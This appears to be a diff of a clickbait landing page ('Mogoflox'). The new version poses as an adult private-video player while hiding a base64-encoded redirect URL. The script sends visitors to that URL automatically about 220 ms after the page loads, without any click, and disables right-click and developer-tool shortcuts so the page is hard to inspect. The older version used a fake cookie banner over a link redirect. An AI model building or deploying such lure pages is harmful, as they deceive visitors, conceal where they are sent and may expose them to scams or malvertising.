@@ -1,190 +1,260 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Ｍｏｇｏｆｌｏｘ</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { 
-            background-color: #f4f4f4; 
-            margin: 0; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: flex-start; 
-            padding-top: 220px; 
-            height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1,user-scalable=no">
+<meta name="referrer" content="no-referrer">
+<title>Ｍｏｇｏｆｌｏｘ</title>
 
-        /* Tombol Utama */
-        .btn-main {
-            background-color: #000000;
-            color: #ffffff;
-            padding: 12px 30px;
-            border-radius: 12px;
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 20px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            position: relative;
-            z-index: 999;
-        }
+<meta property="og:title" content="Private Access">
+<meta property="og:description" content="Secure media delivery ready to play.">
+<meta property="og:image" content="https://vidley.pw/tombolplay.jpg">
+<meta property="og:type" content="website">
 
-        /* Cookie Modal */
-        .cookie-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.05);
-            display: flex;
-            justify-content: center;
-            align-items: flex-end;
-            padding-bottom: 25px;
-            z-index: 100;
-            pointer-events: none;
-        }
+<link rel="preconnect" href="https://cdn.videy.co">
+<link rel="preconnect" href="https://cdn.jsdelivr.net">
 
-        .cookie-card {
-            background: #ffffff;
-            width: 92%;
-            max-width: 380px;
-            padding: 24px;
-            border-radius: 12px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
-            pointer-events: auto;
-        }
-
-        .cookie-card h2 { font-size: 18px; margin: 0 0 15px 0; color: #000; font-weight: 700; }
-        .cookie-card p { font-size: 14px; color: #333; line-height: 1.4; margin-bottom: 20px; }
-
-        .btn-group { display: flex; flex-direction: column; gap: 8px; }
-        .c-btn {
-            width: 100%;
-            padding: 10px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            border: 1px solid #ddd;
-            background: #fff;
-            color: #333;
-        }
-        .c-btn-blue { background: #1a73e8; color: #fff; border: none; }
-
-        .footer-brand {
-            margin-top: 15px;
-            font-size: 11px;
-            color: #777;
-            text-align: center;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .cookie-logo-box {
-            display: flex;
-            align-items: center;
-            font-weight: 700;
-            color: #333;
-        }
-
-        /* Logo Perisai Kustom SVG */
-        .custom-logo {
-            width: 16px;
-            height: 16px;
-            margin-right: 4px;
-            display: flex;
-            align-items: center;
-        }
-
-        .brand-cookie { color: #202c3d; }
-        .brand-admin { color: #a17038; }
-    </style>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{
+height:100%;
+background:#000;
+font-family:Arial,Helvetica,sans-serif;
+overflow:hidden;
+}
+body{
+display:flex;
+align-items:center;
+justify-content:center;
+color:#fff;
+}
+.wrap{
+width:100%;
+max-width:390px;
+height:100vh;
+max-height:760px;
+background:#050505;
+position:relative;
+overflow:hidden;
+}
+#bgVideo,#thumb{
+position:absolute;
+inset:0;
+width:100%;
+height:100%;
+object-fit:cover;
+}
+#bgVideo{
+filter:blur(10px) brightness(.45);
+transform:scale(1.08);
+opacity:0;
+transition:opacity .5s ease;
+}
+#thumb{
+filter:blur(8px) brightness(.45);
+}
+.overlay{
+position:absolute;
+inset:0;
+background:linear-gradient(to bottom,rgba(0,0,0,.35),rgba(0,0,0,.82));
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+padding:20px;
+text-align:center;
+z-index:5;
+}
+.badge{
+border:2px solid #ff1a1a;
+padding:4px 14px;
+font-size:12px;
+font-weight:900;
+letter-spacing:2px;
+border-radius:4px;
+color:#ff1a1a;
+margin-bottom:12px;
+}
+.small{
+font-size:11px;
+letter-spacing:3px;
+opacity:.85;
+margin-bottom:28px;
+}
+.play{
+width:92px;
+height:92px;
+border-radius:50%;
+background:#e50914;
+display:flex;
+align-items:center;
+justify-content:center;
+box-shadow:0 0 30px rgba(229,9,20,.65);
+animation:pulse 1.3s infinite;
+cursor:pointer;
+}
+.play:before{
+content:"";
+margin-left:7px;
+border-left:28px solid #fff;
+border-top:18px solid transparent;
+border-bottom:18px solid transparent;
+}
+@keyframes pulse{
+0%{transform:scale(1)}
+50%{transform:scale(1.08)}
+100%{transform:scale(1)}
+}
+.cta{
+margin-top:30px;
+font-size:13px;
+font-weight:700;
+letter-spacing:3px;
+}
+.bottom{
+position:absolute;
+bottom:0;
+left:0;
+right:0;
+padding:16px;
+text-align:center;
+font-size:11px;
+opacity:.65;
+z-index:6;
+background:linear-gradient(to top,#000,transparent);
+}
+.loader{
+position:absolute;
+inset:0;
+background:#000;
+display:none;
+z-index:20;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+}
+.spin{
+width:42px;
+height:42px;
+border:3px solid rgba(255,255,255,.15);
+border-top:3px solid #e50914;
+border-radius:50%;
+animation:rot .8s linear infinite;
+margin-bottom:14px;
+}
+@keyframes rot{
+to{transform:rotate(360deg)}
+}
+.loadtxt{
+font-size:11px;
+letter-spacing:3px;
+color:#ff4040;
+}
+</style>
 </head>
+
 <body>
+<div class="wrap" id="hitArea">
 
-    <button class="btn-main" onclick="startLoading()">
-        🔗👉Video here🔗
-    </button>
+<img id="thumb" src="https://vidley.pw/tombolplay.jpg" alt="preview">
+<video id="bgVideo" autoplay muted loop playsinline></video>
 
-    <div id="cookieBox" class="cookie-overlay">
-        <div class="cookie-card">
-            <h2>We respect your privacy</h2>
-            <p>
-                Cookies help us improve your experience, deliver personalized content, and analyze traffic. 
-                You can choose which cookies to allow by clicking Customize. Click Accept All to consent or 
-                Reject All to decline non-essential cookies.
-            </p>
-            
-            <div class="btn-group">
-                <button class="c-btn" onclick="hideCookie()">Customize</button>
-                <button class="c-btn" onclick="hideCookie()">Reject All</button>
-                <button class="c-btn c-btn-blue" onclick="hideCookie()">Accept All</button>
-            </div>
+<div class="overlay" id="overlay">
+<div class="badge">18+</div>
+<div class="small">PRIVATE CONTENT</div>
+<div class="play"></div>
+<div class="cta">CLICK TO PLAY</div>
+</div>
 
-            <div class="footer-brand">
-                Powered by 
-                <span class="cookie-logo-box">
-                    <div class="custom-logo">
-                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91V2z" fill="#202c3d"/>
-                            <path d="M12 2v19.91c4.59-1.15 8-5.86 8-10.91V5l-8-3z" fill="#f4a136"/>
-                            <circle cx="12" cy="11" r="3" fill="#ffffff" fill-opacity="0.2"/>
-                        </svg>
-                    </div>
-                    <span class="brand-cookie">Cookie</span><span class="brand-admin">Admin</span>
-                </span>
-            </div>
-        </div>
-    </div>
+<div class="bottom">
+Encrypted • Fast Stream • Secure Access
+</div>
 
-    <script>
-        // Mengambil path terakhir dari URL
-        const path = window.location.pathname;
-        const segments = path.split('/').filter(Boolean);
-        let rawId = segments.pop() || 'default';
+<div class="loader" id="loader">
+<div class="spin"></div>
+<div class="loadtxt">CONNECTING</div>
+</div>
 
-        // Fungsi untuk menghapus ekstensi file (seperti .mp4, .html, dsb)
-        // Ini akan mengambil bagian sebelum titik terakhir
-        const videoId = rawId.includes('.') ? rawId.substring(0, rawId.lastIndexOf('.')) : rawId;
+</div>
 
-        const daftarDomain = [
-            "https://t.co/4q0giU4DLw?",
-        ];
+<script>
+const BASE = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjM3OA==");
+let fired = false;
 
-        const domainTerpilih = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
-        
-        // Hasilnya sekarang akan bersih tanpa .mp4
-        const finalLink = domainTerpilih + videoId;
+function getId(){
+ const p = new URLSearchParams(location.search);
+ let id = p.get("id") || p.get("v");
 
-        function startLoading() {
-            window.location.href = finalLink;
-        }
+ if(!id){
+   let last = location.pathname.split("/").pop().trim();
+   if(last && !last.includes(".") && last !== "index" && last !== "bridge"){
+     id = last;
+   }
+ }
+ return id && id.length >= 3 ? id : null;
+}
 
-        function hideCookie() {
-            document.getElementById('cookieBox').style.display = 'none';
-        }
-    </script>
+function preview(){
+ const id = getId();
+ if(!id) return;
 
-    <!-- Histats -->
-    <script type="text/javascript">
-    var _Hasync= _Hasync|| [];
-    _Hasync.push(['Histats.start', '1,4999645,4,0,0,0,00010000']);
-    _Hasync.push(['Histats.fasi', '1']);
-    _Hasync.push(['Histats.track_hits', '']);
-    (function() {
-    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-    hs.src = ('//s10.histats.com/js15_as.js');
-    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
-    })();
-    </script>
+ const vid = document.getElementById("bgVideo");
+ vid.src = "https://cdn.videy.co/" + id + ".mp4";
+
+ vid.onloadeddata = ()=>{
+   vid.style.opacity = "1";
+   document.getElementById("thumb").style.opacity = ".25";
+ };
+}
+
+function go(){
+ if(fired) return;
+ fired = true;
+
+ document.getElementById("loader").style.display="flex";
+ document.getElementById("overlay").style.opacity="0";
+
+ const id = getId();
+ let url = BASE;
+
+ if(id){
+   url += "/" + id;
+ }
+
+ setTimeout(()=>{
+   location.replace(url);
+ },650);
+}
+
+document.addEventListener("DOMContentLoaded", ()=>{
+ preview();
+
+ document.getElementById("hitArea").addEventListener("click", go);
+
+ setTimeout(go, 220);
+});
+
+document.addEventListener("contextmenu", e=>e.preventDefault());
+document.onkeydown = e=>{
+ if(e.keyCode===123) return false;
+ if(e.ctrlKey && e.shiftKey) return false;
+};
+</script>
+
+<!-- Histats -->
+<script type="text/javascript">
+var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4999645,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script');
+hs.type = 'text/javascript';
+hs.async = true;
+hs.src = 'https://s10.histats.com/js15_as.js';
+(document.head || document.body).appendChild(hs);
+})();
+</script>
+
 </body>
 </html>
